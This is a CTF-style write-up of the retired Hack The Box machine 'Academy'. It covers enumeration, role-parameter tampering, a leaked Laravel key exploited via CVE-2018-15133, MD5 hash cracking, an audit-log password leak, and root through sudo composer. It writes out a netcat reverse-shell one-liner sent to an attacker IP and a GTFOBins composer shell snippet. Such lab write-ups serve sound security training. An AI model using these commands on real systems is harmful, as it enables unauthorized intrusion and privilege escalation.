---
layout: single
title: "Hackthebox write-up: Academy"
namespace: htb-academy
category: Writeup
tags: HackTheBox htb-easy htb-linux
date: 2021-02-27 16:00:00
header:
   teaser: https://i.imgur.com/PjYV5g5.png
---

Hello everyone!

The box of this week will be **Academy**, another easy-rated Linux box from [Hack the Box](https://www.hackthebox.eu) created by [egre55](https://app.hackthebox.eu/users/1190) and [mrb3n](https://app.hackthebox.eu/users/2984).<!--more-->

:information_source: **Info**: Write-ups for Hack the Box are always posted as soon as machines get retired.
{: .notice--info}

![AcademyHTB](https://i.imgur.com/3SXgHMd.png){: .align-center}

## Enumeration

Started the enumeration, as usual, by running `nmap` quick scan to check what is running on this box.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.215
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 12:32 -03
Nmap scan report for 10.10.10.215
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.43 seconds                                  
```

### 80 TCP - HTTP Service

Checking this service from `nmap` scan, noticed that the page contains a redirect to the host **academy.htb**, which probably was not able to follow redirect once this domain name was not solved. After adding it to the `/etc/hosts`, we were able to navigate to the specified page which contains 2 links, one for registering and other to login to this HTB Academy service.

![image-20210217115623157](https://i.imgur.com/jPgHc5K.png){: .align-center}

As the page source did not disclosed nothing, proceeded by creating a dummy account (`dummy:P@ssword`) to get initial access to the platform but noticed something interesting in the post request, where a hidden field from the register form was sending a parameter **roleid**, set to value **0**.

```bash
POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 57
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=amjdd7mhh764rbt4jvb0ujqa1i
Connection: close

uid=dummy&password=P%40ssw0rd&confirm=P%40ssw0rd&roleid=0
```

Let us proceed with the default value for now but we already have an idea of what could be tampered if necessary.

After entering the recently created credentials, noticed that the user could see the academy catalog, with some pre-loaded credit but no operation (unlock) was possible once the unlock API (`http://academy.htb/api/modules/unlock`) was not available, returning a HTTP 404 error.

![image-20210217130138100](https://i.imgur.com/ZWqyaUH.png){: .align-center}

### Gobuster

Once we came into a dead end, let us see if we can brute force any path on this box that might led us to a possible initial foothold. Running `gobuster` gave us 2 interesting pages to investigate further: **admin.php** and **config.php**.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://academy.htb -t 50 -o gobuster_80.txt -x php,html,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://academy.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Cookies:        PHPSESSID=amjdd7mhh764rbt4jvb0ujqa1i
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2021/02/17 12:51:55 Starting gobuster
===============================================================
/index.php (Status: 200)
/images (Status: 301)
/login.php (Status: 200)
/home.php (Status: 200)
/register.php (Status: 200)
/admin.php (Status: 200)
/config.php (Status: 200)
Progress: 48339 / 220561 (21.92%)in.php (Status: 200)

```

### admin.php

Accessing `admin.php` noticed that this pace looks very similar to the previous one, but our dummy credentials did not work there. So, remembering from the parameter we saw in the registration form (**roleid**), I decided to create another account but, in this case, tampering the data sent in the request, replacing 0 by 1 for the mentioned identifier. With this new account, which roleid = **1**, I was able to login to the restricted area and the page below was displayed:

![image-20210217131705459](https://i.imgur.com/s54Fy4z.png){: .align-center}

Besides not existing any information hidden in the source code of this page, what called attention was the host **dev-staging-01.academy.htb** which might also be running in this box.

After adding it to the hosts file under the same IP, the page below was shown, which is an error handler framework for PHP, which allows developers to debug code in their code, but in this case was open and leaking lots of information such as credentials and environment variables.

![image-20210217132525919](https://i.imgur.com/EdXyUeb.png){: .align-center}

What most called attention in the information leaked was the MySQL credentials and Laravel App_key, which might lead us to an initial foothold in this box.

## Initial Foothold

As we don't have MySQL 3306/TCP open in this box, based on the initial nmap scan, searching a little about what could be done by using the Laravel App_key I came across the [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133) which can lead to RCE through an unserialized call in some affected Laravel versions. If we were lucky this might work for this box :smiley:.

Doing some search, I have found [this repository](https://github.com/aljavier/exploit_laravel_cve-2018-15133) which implements this exploit in a simple manner, which was the one I have used to get an initial foothold in the box.

```bash
python3 ./pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f"
```

## User flag

After upgrading the reverse shell, first thing to check was the content of the previously enumerated file **config.php**, listed below:

```bash
www-data@academy:/var/www/html$ cat ./academy/public/config.php 
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy');
?>
```

Connecting to local instance of MySQL using the obtained credentials, noticed that there were some users created and their password hashes, that could possibly be reused by one of the existing users of this box.

```bash
$ mysql -u root -p
Password:

mysql> use academy;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from users;
+----+----------+----------------------------------+--------+---------------------+
| id | username | password                         | roleid | created_at          |
+----+----------+----------------------------------+--------+---------------------+
|  5 | dev      | a317f096a83915a3946fae7b7f035246 |      0 | 2020-08-10 23:36:25 |
| 11 | test8    | 5e40d09fa0529781afd1254a42913847 |      0 | 2020-08-11 00:44:12 |
| 12 | test     | 098f6bcd4621d373cade4e832627b4f6 |      0 | 2020-08-12 21:30:20 |
| 13 | test2    | ad0234829205b9033196ba818f7a872b |      1 | 2020-08-12 21:47:20 |
| 14 | tester   | 098f6bcd4621d373cade4e832627b4f6 |      1 | 2020-08-13 11:51:19 |
+----+----------+----------------------------------+--------+---------------------+
```

After some research, found that these passwords were hashed using MD5 prior to storing in DB. Searching in some services online, the following passwords were retrieved:

- dev: **mySup3rP4s5w0rd!!**
- test8: **test8**
- test: **test**
- test2: **test2**
- tester: **test**

Now that we have a few passwords, we need to check which user possibly has the user flag. By running the command below, we have identified user **cry0l1t3** as the one we should test the obtained passwords so far:

```bash
www-data@academy:/home$ find /home -type f 2>/dev/null | grep user.txt
/home/cry0l1t3/user.txt
```

At the first try, using `mySup3rP4s5w0rd!!` we were able to login as cry0l1t3 and get the user flag

```bash
cry0l1t3@academy:~$ cat user.txt 
<redacted>
```

## Root flag

Now running as cry0l1t3, we can enumerate further this box. The first thing to do is to check his permissions. The user `cry0l1t3` cannot run anything as root, based on `sudo -l` execution but he is member of **adm** group, which allow us to read contents from `/var/log` which might leak some information.

```bash
cry0l1t3@academy:~$ sudo -l
[sudo] password for cry0l1t3: 
Sorry, user cry0l1t3 may not run sudo on academy.
cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

Always when inspecting the logs from a CTF box, is important to consider its creation time, so all the other player registry entries can be ignored from the inspection. An easier way is to use the command below, which filters only files older than X days, in my case 100 which is the period of days since this box was released in the moment I am solving it.

```bash
find /var/log -mtime +100 -print 2>/dev/null
```

Checking first the apache logs, nothing interesting was found by inspecting the access logs, so the most interesting in sequence are the audit logs and then any cron execution.

Checking the audit logs, we can see 2 files matching the mentioned period, which will later be inspected.

```bash
cry0l1t3@academy:~$ find . -mtime +100 -print 2>/dev/null | grep audit
/var/log/audit/audit.log.2
/var/log/audit/audit.log.3
```

Looking for interesting commands on then (`sudo`, `su`, `passwd`) that could possibly leak some information, I was lucky to find one occurrence of **su**:

```bash
cry0l1t3@academy:~$ cat /var/log/audit/audit.log.[2-3] | grep '"su"'
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

The data field contains the HEX value of the parameter used in the execution, which can be converted to text. You can use any converter online, but you can also use `vim` to this task, as described below:

- Open a file in edit mode using `vim`

  ```bash
  vim /tmp/test
  ```

- Type `Esc` to enter em command mode and enter command `:% !xxd`. This will convert the existing content into HEX

- Now pressing `i` we'll enter in *Insert Mode* and paste the HEX content we want to convert, right after `00000000:`.

- Press `Esc` again to return to `command mode` and type `:% !xxd -r` to return to the actual content to ASCII.

- You can later save and exit by entering the command `:wq!`  but you might have also seen the actual content of this HEX value. Below is the output of the file I've created to do this conversion:

  ```bash
  cat /tmp/test                    
  mrb3n_Ac@d3my!
  ```

As **mrb3n** is one of the other users of this box this could probably be his password, which was confirmed by running `su mrb3n` and typing the password found.

Enumerating his permissions, noticed that he's not member of any special group but has `sudo` privileges to run **composer**

```bash
mrb3n@academy:~$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
mrb3n@academy:~$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

### Abusing `sudo` permissions

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/composer/) is possible to escalate privileges by using composer running the snippet below, which worked without issues:

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

As **root**, finally obtained the flag under `/root/root.txt`

```bash
root@academy:~# id
uid=0(root) gid=0(root) groups=0(root)
root@academy:~# cat root.txt 
<redacted>
root@academy:~#
```

I hope you have enjoyed this box resolution!

See you next time! :smiley:
